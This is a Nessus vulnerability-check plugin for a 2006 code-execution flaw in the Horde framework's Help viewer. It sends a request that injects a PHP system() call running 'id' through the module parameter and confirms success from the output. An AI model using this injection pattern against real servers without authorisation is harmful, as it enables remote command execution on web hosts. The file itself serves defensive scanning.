#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21164);
  script_version("$Revision: 1.18 $");
  script_cvs_date("$Date: 2017/05/16 19:35:39 $");

  script_cve_id("CVE-2006-1491");
  script_bugtraq_id(17292);
  script_osvdb_id(24322);

  script_name(english:"Horde Help Viewer Arbitrary Code Execution");
  script_summary(english:"Tries to run a command using Horde's help viewer");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that allows execution
of arbitrary PHP code.");
  script_set_attribute(attribute:"description", value:
"The version of Horde installed on the remote host fails to sanitize
user-supplied input before using it in the Help viewer to evaluate
code.  An unauthenticated attacker could exploit this flaw to execute
arbitrary command on the remote host subject to the privileges of the
web server user id.");
  script_set_attribute(attribute:"see_also", value:"https://lists.horde.org/archives/announce/2006/000272.html");
  script_set_attribute(attribute:"see_also", value:"https://lists.horde.org/archives/announce/2006/000271.html");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Horde 3.0.10 / 3.1.1 or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');

  script_set_attribute(attribute:"plugin_publication_date", value: "2006/03/29");
  script_set_attribute(attribute:"vuln_publication_date", value: "2006/03/28");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:horde:horde_application_framework");
  script_end_attributes();
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2006-2017 Tenable Network Security, Inc.");

  script_dependencies("horde_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/horde");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0, "The web server on port "+port+" does not support PHP");


# Test an install.
install = get_kb_item(string("www/", port, "/horde"));
if (isnull(install)) exit(0, "Horde was not detected on port "+port);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  cmd = "id";
  http_check_remote_code(
    unique_dir    : dir,
    check_request : string(
      "/services/help/index.php?",
      "module=horde%22;system(", cmd, ");&",
      "show=about"
    ),
    check_result  : "uid=[0-9]+.*gid=[0-9]+.*",
    command       : cmd
  );
}
